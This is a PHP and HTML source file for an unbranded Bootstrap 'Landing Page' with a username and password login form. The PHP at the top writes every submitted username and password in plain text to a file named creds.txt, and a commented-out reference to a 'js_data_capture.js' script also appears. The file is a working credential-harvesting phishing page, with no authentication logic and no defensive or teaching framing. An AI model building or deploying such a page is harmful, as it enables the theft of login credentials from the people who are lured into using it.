<?php 

if ($_SERVER['REQUEST_METHOD']==='POST') {
    $username = isset($_POST['username']) ? $_POST['username'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Create a string with the form data
    $formData = "Username: $username\nPassword: $password\n\n";

    $filename = 'creds.txt';

    $file = fopen($filename, 'a');
    if ($file){
        fwrite($file, $formData);
        fclose($file);
    }
}
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <title>Landing Page</title>

        <!-- Include Bootstrap CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

        <!-- Include Font Awesome CSS -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    </head>
<body>

<nav class="navbar navbar-expand-lg navbar-light bg-light">
    <a class="navbar-brand" href="#">
        <i class="fas fa-code"></i>
    </a>
<button class="navbar-toggler" type="button" data-toggle="collapse"data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
</button>

<div class="collapse navbar-collapse justify-content-end" id="navbarNav">
    <ul class="navbar-nav">
        <li class="nav-item">
            <a class="nav-link" href="#">Home</a>
        </li>
    </ul>
</div>
</nav>

<div class="container">
    <div class="row">
        <div class="col-md-12 text-center mt-5">
            <i class="fas fa-terminal fa-5x text-primary"></i>
            <h1 class="mt-3">Hello World</h1>
        </div>
    </div>
<div class="row mt-5">
    <div class="col-md-6 offset-md-3">
        <form method="POST" id="loginForm">
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username">
        </div>

<div class="form-group">
    <label for="password">Password</label>
    <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password">
</div>
<button type="submit" class="btn btn-primary">Log In</button>
</div>
</div>
</div>

<!--  <script src="js_data_capture.js"></script> -->

<!-- Include Bootstrap JS and jQuery -->

<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>